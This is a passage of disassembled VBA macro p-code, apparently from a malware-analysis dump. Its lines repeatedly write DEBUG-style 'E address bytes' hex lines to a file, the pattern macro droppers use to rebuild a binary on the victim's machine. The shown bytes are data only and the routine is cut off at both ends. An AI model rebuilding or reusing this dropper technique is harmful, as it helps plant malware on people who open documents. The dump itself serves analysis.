' 	PrintItemNL 
' Line #2728:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E60 DC DC DC CE CE CE C2 C4 C5 B3 B6 BA 01 07 0C AB"
' 	PrintItemNL 
' Line #2729:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E70 B4 BD C1 CD D9 C4 D4 E1 BB CA DA 9B AB BB B1 C1"
' 	PrintItemNL 
' Line #2730:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E80 CE BA CA D6 B7 C3 CF B6 C2 CC B2 C1 CA 8C 9D A6"
' 	PrintItemNL 
' Line #2731:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E90 88 99 A6 A4 B9 C8 A2 B9 C9 82 9C AD 65 80 94 63"
' 	PrintItemNL 
' Line #2732:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9EA0 80 95 61 7D 95 61 7B 93 73 8B A3 67 7B 94 68 7A"
' 	PrintItemNL 
' Line #2733:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9EB0 91 39 4A 5F 03 10 26 28 36 49 30 41 54 0E 1F 32"
' 	PrintItemNL 
' Line #2734:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9EC0 05 16 29 34 47 5C 56 69 7E 4D 62 78 49 5D 76 45"
' 	PrintItemNL 
' Line #2735:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9ED0 5B 74 43 58 73 29 3F 5B 1F 34 53 12 29 49 17 2E"
' 	PrintItemNL 
' Line #2736:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9EE0 4E 31 47 6A 34 4A 6D 49 5F 82 58 70 94 4E 65 8B"
' 	PrintItemNL 
' Line #2737:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9EF0 4C 60 89 47 5A 85 4C 5D 88 55 65 90 4E 5E 88 47"
' 	PrintItemNL 
' Line #2738:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F00 56 7D 3B 4B 70 32 42 66 2E 3F 60 29 3B 5A 2E 42"
' 	PrintItemNL 
' Line #2739:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F10 61 3B 4F 6E 43 57 76 4E 63 82 6C 84 A0 58 73 8E"
' 	PrintItemNL 
' Line #2740:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F20 4A 63 83 52 6B 8D 60 79 9B 68 81 A3 61 7B 99 6D"
' 	PrintItemNL 
' Line #2741:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F30 88 A3 86 A1 BC 4F 6A 85 34 4E 6C 2E 48 66 19 33"
' 	PrintItemNL 
' Line #2742:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F40 51 3C 57 72 57 73 8B 57 74 89 47 63 7B 6B 87 9F"
' 	PrintItemNL 
' Line #2743:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F50 5D 77 8F 4F 6A 7F 4A 63 77 37 4F 63 41 57 69 33"
' 	PrintItemNL 
' Line #2744:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F60 49 5B 40 57 67 5B 72 82 6C 82 94 67 7D 8F 77 8F"
' 	PrintItemNL 
' Line #2745:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F70 A1 7D 95 A7 63 7B 8F 66 7E 92 7E 96 AA 7D 96 AA"
' 	PrintItemNL 
' Line #2746:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F80 7B 93 A9 6D 86 9A 57 6F 83 71 87 99 A1 B6 C5 A0"
' 	PrintItemNL 
' Line #2747:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9F90 B3 C0 5A 6B 74 3B 49 4F 50 5C 62 46 51 55 3D 48"
' 	PrintItemNL 
' Line #2748:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9FA0 4C 35 40 44 36 42 48 3C 48 4E 35 41 45 51 5D 5F"
' 	PrintItemNL 
' Line #2749:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9FB0 44 4E 4E 42 4A 49 3C 44 43 05 0D 0C 00 00 F3 F3"
' 	PrintItemNL 
' Line #2750:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9FC0 F3 F0 F0 F0 DC DC DC D2 D2 D2 C8 CA CB B2 B5 B9"
' 	PrintItemNL 
' Line #2751:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9FD0 00 00 04 86 8F 98 A5 B1 BD 9F AF BC 9A A9 B9 86"
' 	PrintItemNL 
' Line #2752:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9FE0 96 A6 B0 C0 CD C2 D2 DE CA D6 E2 D0 DC E6 B3 C2"
' 	PrintItemNL 
' Line #2753:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9FF0 CB 8A 9B A4 8C 9D AA A4 B7 C6 AD C1 D2 92 AA BC"
' 	PrintItemNL 
' Line #2754:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A000 6E 87 9B 57 72 87 5F 79 91 60 7A 92 76 8E A6 6D"
' 	PrintItemNL 
' Line #2755:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A010 81 9A 6B 7D 94 56 66 7D 02 10 27 26 34 4A 34 45"
' 	PrintItemNL 
' Line #2756:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A020 5A 13 26 3B 0B 1E 33 3D 4F 66 5C 6D 87 47 5B 74"
' 	PrintItemNL 
' Line #2757:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A030 3E 51 6C 41 56 72 3F 53 72 22 37 57 28 3D 5D 36"
' 	PrintItemNL 
' Line #2758:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A040 4C 6F 45 5B 7F 51 69 8D 38 50 74 42 5A 7E 56 6C"
' 	PrintItemNL 
' Line #2759:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A050 90 49 5E 84 4D 62 88 4D 61 8A 50 62 8B 59 6B 94"
' 	PrintItemNL 
' Line #2760:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A060 56 68 91 53 63 8D 59 6A 91 59 6B 90 4B 5F 82 42"
' 	PrintItemNL 
' Line #2761:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A070 56 79 3C 51 71 3D 52 72 4A 5F 7F 4C 61 81 66 7B"
' 	PrintItemNL 
' Line #2762:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A080 9A 52 67 87 47 5D 80 4F 65 89 5A 70 94 61 7A 9C"
' 	PrintItemNL 
' Line #2763:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A090 55 6F 8D 65 80 9B 75 93 AC 4C 69 84 2D 49 67 26"
' 	PrintItemNL 
' Line #2764:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A0A0 44 61 1E 3C 59 4A 69 82 53 74 88 4D 6E 82 4F 6B"
' 	PrintItemNL 
' Line #2765:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A0B0 83 69 85 9D 5A 74 8C 50 6B 80 4C 65 79 39 51 65"
' 	PrintItemNL 
' Line #2766:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A0C0 41 57 69 3D 54 64 4F 63 74 61 75 86 6A 81 91 64"
' 	PrintItemNL 
' Line #2767:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A0D0 7B 8B 79 8F A1 7E 94 A6 63 7B 8F 70 88 9C 78 90"
' 	PrintItemNL 
' Line #2768:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A0E0 A6 7C 94 AA 77 90 A4 67 80 94 61 79 8B 8C A3 B3"
' 	PrintItemNL 
' Line #2769:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A0F0 AD C0 CD 8B 9D A8 47 56 5F 36 44 4A 41 4D 53 42"
' 	PrintItemNL 
' Line #2770:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A100 4D 51 58 63 67 4F 5A 5E 52 5D 61 5C 67 6B 45 51"
' 	PrintItemNL 
' Line #2771:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A110 55 4E 5A 5C 31 3C 3A 3B 44 41 49 52 4F 00 07 04"
' 	PrintItemNL 
' Line #2772:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A120 00 00 F6 F6 F6 EC EC EC DE DE DE D0 D0 D0 BC BE"
' 	PrintItemNL 
' Line #2773:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A130 BF B9 BC C0 00 03 08 70 79 82 6C 78 84 95 A5 B2"
' 	PrintItemNL 
' Line #2774:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A140 C0 CF DF AB BB CB AA BA C7 91 A1 AD 93 9F AB A1"
' 	PrintItemNL 
' Line #2775:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A150 AD B7 87 96 9F 99 A9 B5 B6 C6 D3 A2 B5 C2 A0 B4"
' 	PrintItemNL 
' Line #2776:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A160 C5 A6 BF CF 8E A7 BB 59 74 88 61 7C 91 51 69 81"
' 	PrintItemNL 
' Line #2777:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A170 65 7D 95 6C 82 9B 66 7B 91 70 82 99 1A 2A 41 25"
' 	PrintItemNL 
' Line #2778:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A180 35 4C 2E 3E 55 0A 1C 33 00 12 29 38 49 63 61 72"
' 	PrintItemNL 
' Line #2779:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A190 8D 4D 60 7B 42 54 71 4A 5E 7D 43 56 77 2F 44 64"
' 	PrintItemNL 
' Line #2780:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A1A0 46 5A 7D 5B 71 95 5C 71 97 58 6F 95 3C 53 79 55"
' 	PrintItemNL 
' Line #2781:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A1B0 6C 92 62 78 9C 52 68 8C 58 6D 93 58 6D 93 58 6A"
' 	PrintItemNL 
' Line #2782:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A1C0 93 63 75 9E 64 76 9F 62 76 9F 5C 6E 97 69 7E A4"
' 	PrintItemNL 
' Line #2783:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A1D0 64 79 9F 61 79 9D 59 6F 93 52 68 8B 61 77 9A 5B"
' 	PrintItemNL 
' Line #2784:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A1E0 71 94 75 88 AB 5B 6E 91 4E 5F 86 52 65 8B 62 75"
' 	PrintItemNL 
' Line #2785:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A1F0 9B 76 8C B0 6B 83 A1 7C 97 B2 71 8C A6 5B 79 92"
' 	PrintItemNL 
' Line #2786:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A200 3F 5C 77 2D 4B 68 1C 3A 55 46 65 7E 50 71 85 55"
' 	PrintItemNL 
' Line #2787:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A210 76 89 57 73 8B 69 85 9D 5A 75 8A 59 71 87 55 6D"
' 	PrintItemNL 
' Line #2788:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A220 81 41 59 6B 4B 62 72 51 68 78 54 68 79 61 75 86"
' 	PrintItemNL 
' Line #2789:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A230 6D 84 94 6C 83 93 7F 95 A7 82 98 AA 65 7D 91 71"
' 	PrintItemNL 
' Line #2790:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A240 89 9D 72 8D A2 7A 95 AA 77 90 A4 68 80 92 6D 84"
' 	PrintItemNL 
' Line #2791:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A250 94 9C B1 C0 A9 BB C6 6C 7D 86 24 31 39 23 2F 35"
' 	PrintItemNL 
' Line #2792:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A260 30 3B 3F 41 4C 50 6B 76 7A 55 60 64 4A 55 59 4D"
' 	PrintItemNL 
' Line #2793:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A270 58 5C 4D 59 5D 38 44 46 2D 38 36 34 3D 3A 4B 54"
' 	PrintItemNL 
' Line #2794:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A280 51 00 02 00 00 00 F4 F4 F4 ED ED ED E3 E3 E3 CF"
' 	PrintItemNL 
' Line #2795:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A290 CF CF BF C1 C2 B1 B4 B8 00 00 05 79 82 8B 79 85"
' 	PrintItemNL 
' Line #2796:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A2A0 91 73 83 90 76 85 95 71 81 91 5E 6E 7B 81 91 9D"
' 	PrintItemNL 
' Line #2797:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A2B0 A3 AF BB A1 AD B7 AE BC C8 A2 B2 BE 8E 9E AB 86"
' 	PrintItemNL 
' Line #2798:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A2C0 99 A6 9C B0 C1 AF C6 D6 9B B3 C7 75 8E A2 65 7D"
' 	PrintItemNL 
' Line #2799:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A2D0 93 67 7F 95 62 7A 92 70 86 9F 6D 81 9A 6A 7B 95"
' 	PrintItemNL 
' Line #2800:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A2E0 38 49 63 2C 3B 55 2C 3B 55 16 25 3F 00 06 20 3F"
' 	PrintItemNL 
' Line #2801:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A2F0 50 6B 7B 8C A7 6B 7D 9A 55 67 86 4A 5E 7D 61 74"
' 	PrintItemNL 
' Line #2802:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A300 95 5A 6E 91 51 64 89 64 7A 9E 67 7C A2 5A 6E 97"
' 	PrintItemNL 
' Line #2803:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A310 4E 62 8B 63 78 9E 6D 80 A5 5C 70 93 56 6C 90 57"
' 	PrintItemNL 
' Line #2804:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A320 6D 91 58 6D 93 68 7D A3 71 85 AE 61 77 A0 62 76"
' 	PrintItemNL 
' Line #2805:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A330 9F 6C 82 AB 66 7C A5 62 7C A1 65 7D A1 69 82 A4"
' 	PrintItemNL 
' Line #2806:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A340 76 8F B1 7A 90 B3 84 97 BA 7B 8B B0 7B 8A B1 84"
' 	PrintItemNL 
' Line #2807:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A350 94 BE 7D 8E B5 78 8B B0 6C 81 A0 7A 92 AE 74 8D"
' 	PrintItemNL 
' Line #2808:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A360 A7 5E 79 93 52 6D 88 14 2E 4C 35 50 6B 4D 6B 84"
' 	PrintItemNL 
' Line #2809:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A370 51 70 85 58 76 89 5D 79 91 67 81 99 65 7D 93 67"
' 	PrintItemNL 
' Line #2810:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A380 7F 95 68 80 94 32 4A 5C 56 6D 7D 56 6A 7B 54 69"
' 	PrintItemNL 
' Line #2811:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A390 78 6C 81 90 7C 90 A1 72 86 97 7C 93 A3 65 7C 8C"
' 	PrintItemNL 
' Line #2812:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A3A0 69 7F 91 72 8A 9E 72 8D A2 7C 97 AC 6F 88 9C 5E"
' 	PrintItemNL 
' Line #2813:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A3B0 76 88 7A 8F 9E A7 BA C7 C2 D3 DC CA DA E1 AD BA"
' 	PrintItemNL 
' Line #2814:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A3C0 C2 B6 C2 C8 B6 C1 C5 BA C5 C9 91 9C A0 5A 65 69"
' 	PrintItemNL 
' Line #2815:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A3D0 5E 6A 6C 6E 7A 7C 4C 58 5C 3B 47 49 5B 66 64 58"
' 	PrintItemNL 
' Line #2816:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A3E0 61 5E 55 5E 5B 00 02 00 00 00 F7 F7 F7 EF EF EF"
' 	PrintItemNL 
' Line #2817:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A3F0 E3 E3 E3 CE CE CE C2 C4 C5 B8 BB BF 01 07 0C 7C"
' 	PrintItemNL 
' Line #2818:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A400 85 8E 81 8D 99 62 72 7F 54 63 73 65 75 85 85 95"
' 	PrintItemNL 
' Line #2819:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A410 A2 BE CE DA C6 D2 DE 9E AA B4 9C AA B6 83 90 9E"
' 	PrintItemNL 
' Line #2820:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A420 75 85 92 87 97 A7 A1 B3 C4 AA C1 D1 99 B1 C3 81"
' 	PrintItemNL 
' Line #2821:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A430 9A AE 66 7E 94 69 81 97 6B 83 9B 78 90 A8 72 88"
' 	PrintItemNL 
' Line #2822:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A440 A1 71 85 9E 42 53 6D 27 38 52 2C 3B 55 1A 29 43"
' 	PrintItemNL 
' Line #2823:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A450 00 08 24 43 51 6D 8E 9C B9 85 95 B2 67 76 96 53"
' 	PrintItemNL 
' Line #2824:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A460 65 84 72 83 A4 67 7A 9D 5B 6D 92 6B 7E A3 6E 81"
' 	PrintItemNL 
' Line #2825:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A470 A7 5E 72 9B 4E 62 8B 61 76 9C 6C 7F A4 5F 73 96"
' 	PrintItemNL 
' Line #2826:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A480 5C 72 96 5E 74 98 5A 6F 95 67 7E A4 70 86 AF 68"
' 	PrintItemNL 
' Line #2827:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A490 7E A7 66 7C A6 6E 84 AE 69 82 AA 69 83 A8 69 83"
' 	PrintItemNL 
' Line #2828:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A4A0 A7 6A 85 A7 79 92 B2 7E 95 B5 83 97 BA 7D 8F B4"
' 	PrintItemNL 
' Line #2829:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A4B0 7F 90 B7 83 93 BD 77 88 AF 72 86 A9 6F 84 A3 83"
' 	PrintItemNL 
' Line #2830:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A4C0 9A B4 80 98 B0 70 88 A0 44 5A 76 17 2C 4B 40 56"
' 	PrintItemNL 
' Line #2831:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A4D0 72 58 6F 89 59 71 87 63 7C 90 64 7F 94 68 83 98"
' 	PrintItemNL 
' Line #2832:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A4E0 62 7A 90 64 7D 91 59 71 83 3D 53 65 5E 72 83 4C"
' 	PrintItemNL 
' Line #2833:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A4F0 60 71 5B 70 7F 82 97 A6 81 95 A6 7A 8E 9F 7F 93"
' 	PrintItemNL 
' Line #2834:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A500 A4 6B 82 92 75 8B 9D 77 8F A3 6C 87 9C 7A 94 AC"
' 	PrintItemNL 
' Line #2835:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A510 71 8A 9E 6B 81 93 8B 9E AD AE C0 CB CA D9 E2 DE"
' 	PrintItemNL 
' Line #2836:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A520 EC F2 E2 EE F4 F0 FC FF F1 FC FF F4 FF FF E4 EF"
' 	PrintItemNL 
' Line #2837:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A530 F3 CE D9 DD DE EA EC E2 EE F0 6A 76 7A 30 3C 3E"
' 	PrintItemNL 
' Line #2838:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A540 4C 57 55 53 5C 59 5A 63 60 00 04 01 00 00 F5 F5"
' 	PrintItemNL 
' Line #2839:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A550 F5 ED ED ED E2 E2 E2 D0 D0 D0 C4 C6 C7 B6 B9 BD"
' 	PrintItemNL 
' Line #2840:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A560 00 00 04 6D 76 7F 68 74 80 6B 7B 88 75 84 94 78"
' 	PrintItemNL 
' Line #2841:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A570 88 98 76 86 93 8F 9F AB 97 A3 AF 7E 8A 96 82 8F"
' 	PrintItemNL 
' Line #2842:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A580 9D 76 83 93 72 81 91 7E 8E 9E 96 A8 B9 B0 C7 D7"
' 	PrintItemNL 
' Line #2843:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A590 AF C7 D9 96 AE C0 66 7F 93 5E 77 8B 67 7F 95 7E"
' 	PrintItemNL 
' Line #2844:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A5A0 96 AC 81 98 AE 83 9A B0 5B 70 86 32 44 5B 33 43"
' 	PrintItemNL 
' Line #2845:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A5B0 5A 20 2E 45 00 05 1F 35 44 5E 8B 99 B5 8B 9B B8"
' 	PrintItemNL 
' Line #2846:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A5C0 73 82 A2 59 6B 8A 7D 8E AF 72 85 A8 64 76 9B 70"
' 	PrintItemNL 
' Line #2847:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A5D0 83 A8 73 86 AC 66 79 9F 51 65 8E 66 7B A1 6D 80"
' 	PrintItemNL 
' Line #2848:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A5E0 A5 63 77 9A 62 78 9B 63 79 9C 5B 73 97 6A 81 A7"
' 	PrintItemNL 
' Line #2849:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A5F0 72 88 B1 6E 87 AF 6D 85 AF 6F 87 B1 70 89 B1 73"
' 	PrintItemNL 
' Line #2850:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A600 8D B2 71 8A AC 71 8A AA 7E 99 B4 83 9D BB 7E 95"
' 	PrintItemNL 
' Line #2851:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A610 B5 7C 92 B6 80 95 BB 7E 92 BB 6E 83 A9 70 84 A7"
' 	PrintItemNL 
' Line #2852:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A620 79 8F AB 91 A7 C0 84 9A B3 80 94 AD 35 47 64 28"
' 	PrintItemNL 
' Line #2853:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A630 38 55 53 63 80 63 74 8F 60 72 89 6E 83 98 6A 82"
' 	PrintItemNL 
' Line #2854:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A640 98 6C 87 9C 64 7C 92 66 7F 93 50 68 7A 4D 63 75"
' 	PrintItemNL 
' Line #2855:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A650 62 76 87 45 5A 69 6C 7F 8E 90 A3 B2 7A 8D 9C 7B"
' 	PrintItemNL 
' Line #2856:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A660 90 9F 71 85 96 65 79 8A 74 8A 9C 70 88 9C 66 82"
' 	PrintItemNL 
' Line #2857:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A670 9A 72 8E A6 70 89 9D 76 8D 9D 98 AB B8 AA BB C4"
' 	PrintItemNL 
' Line #2858:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A680 C8 D5 DD EA F6 FC EB F7 FD DC E7 EB CB D7 DB E5"
' 	PrintItemNL 
' Line #2859:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A690 F1 F5 E6 F1 F5 E2 ED F1 F6 FF FF ED F9 FB 8F 9B"
' 	PrintItemNL 
' Line #2860:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A6A0 9F 22 2E 30 3A 44 44 47 4F 4E 4F 57 56 00 01 00"
' 	PrintItemNL 
' Line #2861:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A6B0 00 00 F4 F4 F4 EA EA EA E1 E1 E1 D2 D2 D2 C4 C6"
' 	PrintItemNL 
' Line #2862:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A6C0 C7 B1 B4 B8 00 00 04 70 79 82 7A 86 92 77 87 94"
' 	PrintItemNL 
' Line #2863:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A6D0 79 88 98 73 83 93 6E 7E 8B 7A 8A 96 81 8D 99 74"
' 	PrintItemNL 
' Line #2864:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E A6E0 80 8C 69 76 86 6E 7B 8B 75 83 95 77 87 98 84 96"
' 	PrintItemNL 
' Line #2865:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
